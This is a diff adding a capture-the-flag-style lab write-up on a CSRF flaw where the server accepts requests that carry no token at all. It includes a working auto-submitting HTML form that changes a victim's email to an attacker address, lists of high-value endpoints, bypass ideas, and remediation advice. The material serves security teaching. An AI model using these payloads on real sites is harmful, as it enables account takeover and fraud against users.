@@ -885,3 +885,405 @@ If one method is weak → entire protection fails
 ---
 
 CSRF protection on POST only = instant bypass via GET
+
+---
+
+# 🐞 Lab-3 — CSRF → Missing Token Validation (Email Change)
+
+---
+
+## 🧠 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates a flawed CSRF implementation where the server partially validates tokens.
+
+---
+
+Normally:
+
+A CSRF token must be **present AND valid**.
+
+---
+
+However, in this lab:
+
+The server validates the token **only if it exists**, but does NOT require it.
+
+---
+
+👉 This allows attackers to bypass protection by removing the token entirely.
+
+---
+
+## 🧠 🟦 Core Idea
+
+If CSRF token is optional → protection is broken
+
+---
+
+## 🧠 🟥 Key Exploit
+
+```
+POST /my-account/change-email
+
+email=attacker@evil.com
+```
+
+---
+
+👉 No CSRF token → request still succeeds
+
+---
+
+## 🔍 🧠 What Is This Topic?
+
+### 🔹 Missing CSRF Token Validation
+
+A vulnerability where server checks token validity but fails to enforce its presence
+
+---
+
+## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Capture Request
+
+```
+POST /my-account/change-email
+Content-Type: application/x-www-form-urlencoded
+
+email=test@abc.com&csrf=RANDOM_TOKEN
+```
+
+---
+
+### 🧩 Step 2 — Test Token Validation
+
+Modify token:
+
+```
+email=test@abc.com&csrf=INVALID
+```
+
+---
+
+👉 Result:
+
+```
+Invalid CSRF token
+```
+
+---
+
+### 🧧 Step 3 — Remove CSRF Token Completely
+
+```
+POST /my-account/change-email
+
+email=test@abc.com
+```
+
+---
+
+👉 Result:
+
+✔ Request accepted  
+✔ Email successfully changed  
+
+---
+
+![csrf-missing-token](../images/csrf-missing-token.png)
+
+---
+
+### 🧠 Vulnerability Confirmed
+
+```
+Server does NOT enforce presence of CSRF token
+```
+
+---
+
+### 🧩 Step 4 — Build CSRF Exploit
+
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="attacker@evil.net">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+### 🧩 Step 5 — Deliver Exploit
+
+```
+Host payload on exploit server
+Victim loads page
+```
+
+---
+
+👉 Browser sends authenticated request automatically
+
+---
+
+### 🧩 Step 6 — Result
+
+```
+Email changed without CSRF token
+```
+
+---
+
+## 💣 🟨 Payload Breakdown (Easy)
+
+---
+
+### 🔹 Request
+
+```
+POST /my-account/change-email
+
+email=attacker@evil.net
+```
+
+---
+
+### 🔹 Form
+
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+```
+
+---
+
+### 🔹 Hidden Input
+
+```
+<input type="hidden" name="email" value="attacker@evil.net">
+```
+
+---
+
+### 🔹 Auto Submit
+
+```
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+## 🌍 🟥 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Account Takeover
+
+```
+Change email → reset password → full control
+```
+
+---
+
+### 🔥 Scenario 2 — Banking Actions
+
+```
+Transfer funds without CSRF validation
+```
+
+---
+
+### 🔥 Scenario 3 — Admin Privilege Abuse
+
+```
+Add attacker as admin
+```
+
+---
+
+### 🔥 Scenario 4 — Broken Security Logic
+
+```
+Developer validates token but forgets to enforce presence
+```
+
+---
+
+## ⚔️ 🧠 Attack Chain
+
+---
+
+1️⃣ Capture request  
+2️⃣ Modify CSRF token → rejected  
+3️⃣ Remove CSRF token → accepted  
+4️⃣ Confirm vulnerability  
+5️⃣ Build exploit page  
+6️⃣ Host payload  
+7️⃣ Victim loads page  
+8️⃣ Browser sends request  
+9️⃣ Action executed  
+
+---
+
+## 🎯 High-Value Endpoints
+
+---
+
+### 🔹 Account
+
+```
+/change-email
+/change-password
+```
+
+---
+
+### 🔹 Financial
+
+```
+/transfer-money
+```
+
+---
+
+### 🔹 Admin
+
+```
+/add-admin
+```
+
+---
+
+### 🔹 Profile
+
+```
+/update-profile
+```
+
+---
+
+## ⚠️ 🟥 Real-World Limitations + Bypass
+
+---
+
+### ❌ Strict Token Enforcement
+
+👉 Attack fails
+
+---
+
+### ❌ SameSite Cookies
+
+👉 Cookies blocked
+
+---
+
+### ❌ Origin / Referer Check
+
+👉 Request rejected
+
+---
+
+### ❌ Custom Headers Required
+
+👉 Cannot be forged via HTML
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Find endpoints with missing token enforcement
+Check APIs separately
+Test optional parameters
+```
+
+---
+
+## 🛡️ 🔒 Remediation
+
+---
+
+### 🔴 Root Problem
+
+Token validation exists but token is not required
+
+---
+
+### ✅ Fix 1 — Require CSRF Token
+
+```
+Reject request if token is missing
+```
+
+---
+
+### ✅ Fix 2 — Strict Validation
+
+```
+Token must match session
+```
+
+---
+
+### ✅ Fix 3 — SameSite Cookies
+
+```
+SameSite=Strict
+```
+
+---
+
+### ✅ Fix 4 — Validate Origin / Referer
+
+```
+Allow only same-site requests
+```
+
+---
+
+### ✅ Fix 5 — Use Security Frameworks
+
+```
+Implement proper CSRF middleware
+```
+
+---
+
+## 🧠 🟪 Mental Model
+
+---
+
+Invalid token = blocked  
+
+Missing token = allowed ❌  
+
+---
+
+This = broken protection  
+
+---
+
+## 🎯 🧠 Final Summary
+
+---
+
+✔ Token validation exists but incomplete  
+
+✔ Removing token bypasses protection  
+
+✔ Server trusts request without verification  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+Optional CSRF token = no CSRF protection
